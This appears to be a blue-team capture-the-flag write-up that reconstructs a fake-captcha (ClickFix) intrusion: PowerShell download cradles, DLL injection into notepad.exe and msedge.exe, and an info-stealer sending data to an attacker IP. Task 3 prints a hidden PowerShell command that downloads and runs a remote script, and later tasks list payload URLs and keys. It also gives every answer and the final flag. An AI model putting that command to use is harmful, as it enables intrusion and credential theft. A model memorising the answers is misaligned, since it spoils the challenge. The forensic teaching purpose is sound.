# Spiny Trace (Challenge Group)

* **Category:** BlueTeam / DFIR / Malware Analysis
* **Difficulty:** Medium
* **Total Points:** 245 (19 * 1 pt + 226 pts)
* **Flag:** `pwnsec{095cfa7f04b8a9b8c7f204e911ae738f2449beef677f961e7047164dd2bfd723}`

---

## Scenario Overview

> The Intrusion Detection System flagged an unusual outbound connection from a workstation belonging to one of the company's employees. Nothing else was logged, no alert fired on the endpoint, and the user insists they "just solved a captcha".
>
> You have been handed the forensic artifacts pulled from that machine. Reconstruct the intrusion end to end: how the user was tricked into running the first command, what was staged next, which processes the payload hid inside, what it stole, and where it sent the data.
>
> **- @0x4d & @m7mad**

---

## Attack Chain Breakdown & Task Solutions

### Task 1: Spiny Trace 1 - Initial Access
* **Slug:** `spiny-trace-1---initial-access`
* **Points:** 1
* **Question:**
  Identify the MITRE ATT&CK sub-technique the attacker used to gain initial access.
* **Analysis:**
  The lure page presented a fake verification widget instructing the victim to press `Windows + R`, paste the clipboard contents, and hit Enter (a classic ClickFix / fake captcha campaign). MITRE ATT&CK classifies this as **T1204.004** (*User Execution: Malicious Copy/Paste*).
* **Answer:** `T1204.004`

---

### Task 2: Spiny Trace 2 - The Lure Domain
* **Slug:** `spiny-trace-2---the-lure-domain`
* **Points:** 1
* **Question:**
  What is the malicious domain the user accessed?
* **Analysis:**
  Network packet inspection (`challenge.pcapng`) and DNS resolution logs show the victim navigated to `captoolsz.com`.
* **Answer:** `captoolsz.com`

---

### Task 3: Spiny Trace 3 - The Pasted Command
* **Slug:** `spiny-trace-3---the-pasted-command`
* **Points:** 1
* **Question:**
  What is the exact command the user was tricked into executing?
* **Analysis:**
  The JavaScript on `captoolsz.com` loaded malicious PowerShell instructions onto the Windows clipboard:
  `powershell -window hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.59.152/update.ps1')"`.
* **Answer:** `powershell -window hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.59.152/update.ps1')"`

---

### Task 4: Spiny Trace 4 - Second Stage
* **Slug:** `spiny-trace-4---second-stage`
* **Points:** 1
* **Question:**
  What is the URL of the second PowerShell script the attacker downloaded?
* **Analysis:**
  Inspecting [`update.ps1`](./artifacts/update.ps1) reveals a subsequent cradle pulling down the next stage:
  `http://192.168.59.152/user_profiles_photo/windows.ps1`.
* **Answer:** `http://192.168.59.152/user_profiles_photo/windows.ps1`

---

### Task 5: Spiny Trace 5 - Injected From Within
* **Slug:** `spiny-trace-5---injected-from-within`
* **Points:** 1
* **Question:**
  What is the MITRE ATT&CK sub-technique used by the inner PowerShell?
* **Analysis:**
  [`windows.ps1`](./artifacts/windows.ps1) uses standard Windows APIs (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) to inject a DLL into another running process. This corresponds to MITRE ATT&CK **T1055.001** (*Process Injection: Dynamic-link Library Injection*).
* **Answer:** `T1055.001`

---

### Task 6: Spiny Trace 6 - First Injection
* **Slug:** `spiny-trace-6---first-injection`
* **Points:** 1
* **Question:**
  What is the name of the first process the attacker injected into, and the temporary name given to the malicious DLL? Format: `process.exe, filename.ext`
* **Analysis:**
  The script locates `notepad.exe` and writes a temporary DLL named `tmp2A0E.tmp.dll` to disk before loading it into memory.
* **Answer:** `notepad.exe, tmp2A0E.tmp.dll`

---

### Task 7: Spiny Trace 7 - Keys in the Script
* **Slug:** `spiny-trace-7---keys-in-the-script`
* **Points:** 1
* **Question:**
  What is the KEY:IV used for that decryption? Format: `KEY:IV` (hex)
* **Analysis:**
  Extracting the AES decryption routine parameters in `windows.ps1` reveals the 256-bit AES key and 128-bit IV:
  `8a4a35876563f1ea8baad6cda0099c24d53d4ce5670b3b23b13063127611bb37:c0a675360817d8dba62cc79e2fa77734`.
* **Answer:** `8a4a35876563f1ea8baad6cda0099c24d53d4ce5670b3b23b13063127611bb37:c0a675360817d8dba62cc79e2fa77734`

---

### Task 8: Spiny Trace 8 - Second Injection
* **Slug:** `spiny-trace-8---second-injection`
* **Points:** 1
* **Question:**
  What is the name of the second injected process?
* **Analysis:**
  For the main info-stealer payload, the malware shifts execution context to `msedge.exe`.
* **Answer:** `msedge.exe`

---

### Task 9: Spiny Trace 9 - The Payload
* **Slug:** `spiny-trace-9---the-payload`
* **Points:** 1
* **Question:**
  What is the URL used to download the payload injected into that process?
* **Analysis:**
  HTTP stream extraction from PCAP shows the stealer payload retrieved from:
  `http://192.168.59.152/user_profiles_photo/captcha.bin`.
* **Answer:** `http://192.168.59.152/user_profiles_photo/captcha.bin`

---

### Task 10: Spiny Trace 10 - Unwrapping the Payload
* **Slug:** `spiny-trace-10---unwrapping-the-payload`
* **Points:** 1
* **Question:**
  What is the key used to decrypt the payload?
* **Analysis:**
  `captcha.bin` is decrypted using the SHA-256 derived hex key:
  `d2977bb8170bc2f4f3bdceb91f0ecbac48d2bc6c68e5d3f135f5360aa263e9d4`.
* **Answer:** `d2977bb8170bc2f4f3bdceb91f0ecbac48d2bc6c68e5d3f135f5360aa263e9d4`

---

### Task 11: Spiny Trace 11 - Dropped to Disk
* **Slug:** `spiny-trace-11---dropped-to-disk`
* **Points:** 1
* **Question:**
  What is the name of the payload as it is dropped on the machine?
* **Analysis:**
  The decrypted DLL is saved to disk under the filename:
  `dll_2872_3879781_41.dll`.
* **Answer:** `dll_2872_3879781_41.dll`

---

### Task 12: Spiny Trace 12 - Emptying the Browser
* **Slug:** `spiny-trace-12---emptying-the-browser`
* **Points:** 1
* **Question:**
  What is the name of the tool the malware uses to extract browser credentials?
* **Analysis:**
  Forensic examination of dropped binaries and process trees shows the use of `chromelevator.exe` to bypass browser master password protections and DPAPI encryption.
* **Answer:** `chromelevator.exe`

---

### Task 13: Spiny Trace 13 - Staging the Loot
* **Slug:** `spiny-trace-13---staging-the-loot`
* **Points:** 1
* **Question:**
  What is the full path of the file the attacker uses to store the exfiltrated data?
* **Analysis:**
  All harvested credentials, system info, and wallet data are aggregated into:
  `C:\Users\Public\Documents\stealer_data.txt`.
* **Answer:** `C:\Users\Public\Documents\stealer_data.txt`

---

### Task 14: Spiny Trace 14 - Looking Around First
* **Slug:** `spiny-trace-14---looking-around-first`
* **Points:** 1
* **Question:**
  What is the first path the malware checks for anti-virus solutions?
* **Analysis:**
  Reverse engineering `decrypted_captcha.dll` reveals defensive checks starting with the default Windows Defender directory:
  `C:\Program Files\Windows Defender`.
* **Answer:** `C:\Program Files\Windows Defender`

---

### Task 15: Spiny Trace 15 - Chasing Coins
* **Slug:** `spiny-trace-15---chasing-coins`
* **Points:** 1
* **Question:**
  How many crypto wallets does the malware check for?
* **Analysis:**
  Enumerating the wallet target configuration array in the stealer binary identifies targeted checks for exactly 14 cryptocurrency extensions/wallets (Metamask, Exodus, Electrum, Binance, etc.).
* **Answer:** `14`

---

### Task 16: Spiny Trace 16 - Fingerprinting the Host
* **Slug:** `spiny-trace-16---fingerprinting-the-host`
* **Points:** 1
* **Question:**
  What is the Windows API the malware uses to obtain the IP and MAC address?
* **Analysis:**
  The binary imports and calls `IPHLPAPI.DLL!GetAdaptersInfo` to query local network interfaces and physical MAC addresses.
* **Answer:** `GetAdaptersInfo`

---

### Task 17: Spiny Trace 17 - Where It Went
* **Slug:** `spiny-trace-17---where-it-went`
* **Points:** 1
* **Question:**
  What is the IP and port the malware uses for exfiltration? Format: `IP:PORT`
* **Analysis:**
  The network traffic log demonstrates a socket connection sending stolen data to:
  `192.168.59.152:4444`.
* **Answer:** `192.168.59.152:4444`

---

### Task 18: Spiny Trace 18 - Sealing the Loot
* **Slug:** `spiny-trace-18---sealing-the-loot`
* **Points:** 1
* **Question:**
  What is the key the attacker uses to encrypt the stolen data?
* **Analysis:**
  Before egress over port 4444, the exfiltration payload is encrypted with the 128-bit AES key:
  `2B7E151628AED2A6ABF7158809CF4F3C`.
* **Answer:** `2B7E151628AED2A6ABF7158809CF4F3C`

---

### Task 19: Spiny Trace 19 - Impact
* **Slug:** `spiny-trace-19---impact`
* **Points:** 1
* **Question:**
  What is the password of the user's Instagram account?
* **Analysis:**
  Decrypting the exfiltrated `stealer_data.txt` stream using the AES key reveals the saved Instagram credential with password:
  `v@VboF8EDZWPM5nv7`.
* **Answer:** `v@VboF8EDZWPM5nv7`

---

### Task 20: Spiny Trace 20 - Claim your points
* **Slug:** `spiny-trace-20---claim-your-points`
* **Points:** 226
* **Question:**
  Concatenate every answer submitted in this group, in order (question 1 through 19), directly with no separators, spaces, or newlines. The seal is the SHA-256 of that string.
  `pwnsec{ sha256(answer1 + answer2 + ... + answer19) }`
* **Calculation:**
  See [`solve.py`](./solve.py).
* **Final Flag:**
  ```
  pwnsec{095cfa7f04b8a9b8c7f204e911ae738f2449beef677f961e7047164dd2bfd723}
  ```
